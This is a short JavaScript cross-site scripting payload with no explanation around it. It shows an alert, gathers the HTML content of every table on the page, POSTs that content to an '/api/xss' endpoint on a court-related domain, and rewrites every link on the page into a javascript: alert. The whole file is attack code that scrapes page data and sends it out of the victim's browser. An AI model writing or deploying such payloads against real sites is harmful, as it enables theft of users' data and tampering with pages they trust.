alert("XSS");

function XSS(){
    const elementos = document.getElementsByTagName(`table`);
    conteudo = Array.from(elementos).map(d => d.innerHTML);  
    fetch(`https://jornada-hmg.trf2.jus.br/api/xss`, {
        method: "POST",
        body: conteudo
    })
}

XSS();

$("a").prop("href", "javascript:alert('XSS');")